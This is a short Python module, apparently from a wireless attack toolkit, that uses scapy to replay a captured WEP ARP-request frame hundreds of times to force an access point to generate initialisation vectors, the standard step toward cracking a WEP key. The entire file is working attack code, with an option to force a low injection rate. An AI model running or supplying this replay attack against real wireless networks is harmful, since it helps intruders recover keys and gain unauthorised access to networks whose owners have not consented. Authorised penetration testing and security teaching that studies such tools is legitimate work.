"""WEP ARP-request replay: reinject a captured frame to force IV generation."""

from __future__ import annotations

from scapy.packet import Packet
from scapy.sendrecv import sendp

from ..frames import with_forced_rate


def replay_arp(iface: str, pkt: Packet, count: int = 500, interval: float = 0.01,
                low_rate: bool = False) -> int:
    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent.

    low_rate: force a 2 Mbps injection rate instead of replaying the
    frame's own captured RadioTap -- see frames.with_forced_rate.
    """
    if low_rate:
        pkt = with_forced_rate(pkt, mbps=2)
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
    return count
